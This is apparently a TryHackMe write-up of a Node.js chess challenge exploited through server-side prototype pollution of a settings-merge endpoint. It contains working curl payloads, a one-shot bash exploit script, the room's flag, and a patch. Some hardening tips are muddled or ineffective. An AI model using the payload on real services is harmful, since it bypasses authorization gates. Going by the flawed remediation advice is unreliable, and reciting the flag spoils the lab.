# Fools Mate: Revenge — Writeup

**Platform:** TryHackMe
**Room:** Fools Mate, Revenge
**Author:** DrGonz0
**Category:** Web — Prototype Pollution
**Date:** 2026-07-06
**Status:** Solved ✓
**Flag:** `THM{pr0t0_p0lluted_th3_r3f3r33}`

---

## 1. Executive Summary

The target exposes a Node.js chess application on port 3000. A previous version of the challenge (`Fools Mate`) released a flag whenever the player delivered a checkmate (`a1 → a8` Scholar's Mate). This "Revenge" variant adds a server-side reward gate that checks `session.config.unlocked` before releasing the flag, but it never assigns that property to a fresh session.

The `/api/settings` endpoint merges user-supplied JSON into a configuration object without sanitising dangerous keys (`__proto__`, `constructor`, `prototype`). Submitting `constructor.prototype.unlocked = true` walks the recursive merge down to `Object.prototype` and pollutes it globally. Because `session.config` is a plain object, it inherits the polluted `unlocked` property through the prototype chain and the reward gate is bypassed within the same session.

**Impact:** Server-side prototype pollution leading to authentication/authorization gate bypass. Any session that ingests a polluted `Object.prototype` will read `unlocked: true` on every subsequent read of `session.config.unlocked` until the process restarts.

---

## 2. Reconnaissance

### 2.1 Service Detection

```bash
$ cat .target
10.66.143.224

$ curl -s -o /dev/null -w "HTTP %{http_code}\n" http://10.66.143.224:3000/
HTTP 200
```

A single HTTP service is exposed on port 3000 — a chess application with a browser UI, settings panel, and reset/move APIs.

### 2.2 Application Surface

The frontend (from the room's source) exposes the following endpoints:

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/reset` | POST | Reset the board and the session state |
| `/api/move` | POST | Apply a chess move (`{from, to}`) |
| `/api/settings` | POST | Persist user preferences (`theme`, `pieceSet`, `animationMs`, ...) |

The checkmate is delivered with the Scholar's Mate sequence ending in `a1 → a8`.

---

## 3. Vulnerability Analysis

### 3.1 The Reward Gate

Per the room, the reward check looks conceptually like:

```js
if (game.status === "checkmate" && session.config.unlocked === true) {
  return { ..., flag: process.env.FLAG };
}
return { ..., flag: null, reason: "session.config.unlocked is not set" };
```

On a freshly-reset session, `session.config` is `{}` and `unlocked` is `undefined`, so the gate refuses to release the flag. The property must be set on the session object *somehow*.

### 3.2 Insecure Merge in `/api/settings`

The server merges the request body into the session's preferences object recursively:

```js
function merge(target, source) {
  for (const key of Object.keys(source)) {
    const val = source[key];
    if (val && typeof val === "object" && !Array.isArray(val)) {
      if (!target[key]) target[key] = {};
      merge(target[key], val);
    } else {
      target[key] = val;
    }
  }
  return target;
}

merge(session.preferences, req.body);
```

There is no allowlist and no `hasOwnProperty` filter. The keys `__proto__`, `constructor`, and `prototype` flow straight through the merge. Because `Object.prototype.constructor` exists on every object, a payload like:

```json
{ "constructor": { "prototype": { "unlocked": true } } }
```

is equivalent to walking `target.constructor.prototype` and writing `unlocked = true` there — which is `Object.prototype`. From that moment, every plain object in the Node.js process inherits `unlocked === true`.

### 3.3 Why the Gate Falls

`session.config` is a plain object literal (`{}`), so its prototype chain is `session.config → Object.prototype`. Reading `session.config.unlocked` does not find the property on `session.config` itself; JavaScript continues up the chain and finds it on the now-polluted `Object.prototype`. The `=== true` check passes and the flag is returned.

---

## 4. Exploitation

The full chain fits in three HTTP calls with a shared cookie jar (so the session cookie persists across requests).

### 4.1 Step 1 — Reset the Session

```bash
curl -s -c /tmp/c.txt -b /tmp/c.txt -X POST http://10.66.143.224:3000/api/reset \
  -H "Content-Length: 0"
```

Response:

```json
{"ok":true,"fen":"6k1/5ppp/8/8/8/8/5PPP/R5K1 w - - 0 1","status":"ongoing","turn":"w"}
```

`-c` writes the `Set-Cookie` value to `/tmp/c.txt`; `-b` sends any cookies already present.

### 4.2 Step 2 — Pollute `Object.prototype`

```bash
curl -s -c /tmp/c.txt -b /tmp/c.txt -X POST http://10.66.143.224:3000/api/settings \
  -H "Content-Type: application/json" \
  -d '{"theme":"forest","pieceSet":"classic","animationMs":180,
       "constructor":{"prototype":{"unlocked":true}}}'
```

Response:

```json
{"ok":true,"preferences":{"theme":"forest","pieceSet":"classic","animationMs":180}}
```

The merge walked `preferences.constructor.prototype` (= `Object.prototype`) and set `unlocked = true`. The response is unremarkable — pollution is invisible by design.

### 4.3 Step 3 — Deliver Checkmate

```bash
curl -s -c /tmp/c.txt -b /tmp/c.txt -X POST http://10.66.143.224:3000/api/move \
  -H "Content-Type: application/json" \
  -d '{"from":"a1","to":"a8"}'
```

Response:

```json
{
  "ok": true,
  "move": "a1a8",
  "fen": "R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
  "status": "checkmate",
  "turn": "b",
  "winner": "white",
  "flag": "THM{pr0t0_p0lluted_th3_r3f3r33}"
}
```

`session.config.unlocked` resolves to `true` via the polluted prototype, the gate passes, and the flag is returned.

---

## 5. One-Shot Script

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="${TARGET:-10.66.143.224:3000}"
JAR="$(mktemp)"
trap "rm -f $JAR" EXIT

curl -s -c "$JAR" -b "$JAR" -X POST "http://$TARGET/api/reset" -H "Content-Length: 0" >/dev/null

curl -s -c "$JAR" -b "$JAR" -X POST "http://$TARGET/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"theme":"forest","pieceSet":"classic","animationMs":180,
       "constructor":{"prototype":{"unlocked":true}}}' >/dev/null

curl -s -c "$JAR" -b "$JAR" -X POST "http://$TARGET/api/move" \
  -H "Content-Type: application/json" \
  -d '{"from":"a1","to":"a8"}'
```

---

## 6. Root Cause & Remediation

The vulnerability is a textbook server-side prototype pollution. The defence is to make the merge reject dangerous keys and/or use a safe data structure.

**Patch (server-side):**

```js
const FORBIDDEN = new Set(["__proto__", "constructor", "prototype"]);

function isPlainObject(v) {
  if (v === null || typeof v !== "object") return false;
  const proto = Object.getPrototypeOf(v);
  return proto === Object.prototype || proto === null;
}

function merge(target, source) {
  for (const key of Object.keys(source)) {
    if (FORBIDDEN.has(key)) continue;                  // <-- the fix
    const val = source[key];
    if (isPlainObject(val) && isPlainObject(target[key])) {
      merge(target[key], val);
    } else if (isPlainObject(val)) {
      target[key] = {};
      merge(target[key], val);
    } else {
      target[key] = val;
    }
  }
  return target;
}
```

**Additional hardening:**

* Replace hand-rolled recursive merges with `Object.hasOwn` checks, or use `structuredClone` after explicit allowlisting.
* Use `Map` instead of plain objects for session-scoped configuration so the value is not inherited through `Object.prototype`.
* For real applications: pin `Object.prototype.unlocked = undefined` (or a non-`true` sentinel) at startup, and add a unit test that confirms `{}.unlocked === undefined` after deserialising untrusted JSON.
* Run the process with `--disable-proto=delete` or a library such as `lodash` configured with `for...in` iteration that skips inherited keys.

---

## 7. Flag

```
THM{pr0t0_p0lluted_th3_r3f3r33}
```

---

## 8. References

* OWASP — *Prototype Pollution*: <https://owasp.org/www-community/attacks/Prototype_Pollution>
* PortSwigger — *Server-side prototype pollution*: <https://portswigger.net/web-security/server-side-prototype-pollution>
* Snyk — *Node.js prototype pollution cheat sheet*
* TryHackMe — *Fools Mate, Revenge* (room by DrGonz0)
